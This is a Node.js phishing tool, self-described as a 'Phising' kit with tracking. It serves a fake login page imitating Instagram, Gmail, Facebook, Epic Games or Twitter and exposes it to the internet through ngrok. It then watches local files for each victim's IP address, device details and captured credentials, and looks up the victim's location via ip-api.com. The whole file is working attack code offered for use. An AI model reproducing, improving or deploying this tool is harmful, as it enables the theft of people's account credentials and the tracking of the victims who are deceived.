// Copyright© 2020 By FajarTheGGman

// Package Required 
var fs = require('fs')
var load = require('ora')
var req = require('request')
var ask = require('inquirer')
var s = require('shelljs')

var banner = require("begoo")
var warna = require("chalk")
var warna2 = require("colors")
var watermark = require('jsome')

console.log(banner("Wellcome To KnowYourSelf \n Simple Phising Tools With Tracking features :)"))

watermark({
    Coder: "FajarTheGGman",
    Github: "FajarTheGGman",
    Instagram: "FajarTheGGman",
    Twitter: "@FajarFi69170369"
})


// User Input using inquirer package
ask.prompt({
    type: "list"
    ,
    name: "Choose_Template",
    choices: [
        "[Instagram]",
        "[Gmail]",
        "[Facebook]",
        "[Epic Games]",
        "[Twitter]",
        "[Forbidden Page]"
    ]
}).then(x => {
    if(x.Choose_Template == "[Instagram]"){
        s.exec("php -S localhost:3000 -t ./template/instagram > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }else if(x.Choose_Template === "[Facebook]"){
        s.exec("php -S localhost:3000 -t ./template/fb > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }else if(x.Choose_Template == "[Gmail]"){
        s.exec("php -S localhost:3000 -t ./template/gmail > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }else if(x.Choose_Template == "[Epic Games]"){
        s.exec("php -S localhost:3000 -t ./template/epicgames > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }else if(x.Choose_Template == "[Twitter]"){
        s.exec("php -S localhost:3000 -t ./template/twitter > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }else if(x.Choose_Template == "[Forbidden Page]"){
        s.exec("php -S localhost:3000 -t ./template/404 > /dev/null 2>&1 &")
        s.exec("./ngrok http 3000 > /dev/null 2>&1 &")
        tracking()
    }
})


// Tracking Function

function tracking(){
setTimeout(() => {

console.log(warna.bgBlue("[Link] : ") + warna2.rainbow(s.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")))


// Watch ip.txt file for catch victim ip
fs.watchFile("./output/ip.txt", (current, previous) => {
    var device = fs.readFileSync("./output/device.txt", "utf8")
    var parsing = fs.readFileSync("./output/ip.txt", "utf8")
    var phising = fs.readFileSync("./output/phising.txt", "utf8")
    
    
    // and send the ip to ip-api.com for location
    req("http://ip-api.com/json/" + parsing, (err,res,body) => {
        var js = JSON.parse(body)
        console.log(warna2.red("[!] Type CTRL + C To exit\n"))
        console.log(warna2.rainbow("[#] IP : " + js['query']))
        console.log(warna.bgCyan("[>] Country : " + js['country']))
        console.log(warna.bgCyan("[>] Country Code : " + js['countryCode']))
        console.log(warna.bgCyan("[>] Region : " + js['region']))
        console.log(warna.bgCyan("[>] Region Name : " + js['regionName']))
        console.log(warna.bgCyan("[>] City : " + js['city']))
        console.log(warna.bgCyan("[>] Location : " + js['lat'] + js['lon']))
        console.log(warna.bgCyan("[>] Timezone : " + js['timezone']))
        console.log(warna.bgCyan("[>] Provider : " + js['isp']))
        
        console.log(warna2.rainbow("[-=========-  <Device Information>  -=========-]"))
        
        console.log(warna.bgGreen(device))
        
        console.log(warna2.rainbow("[-=========-  <Result Phising>  -=========-]"))
        
        console.log(warna.bgBlue(phising))
        
    })
})
}, 3000)
}

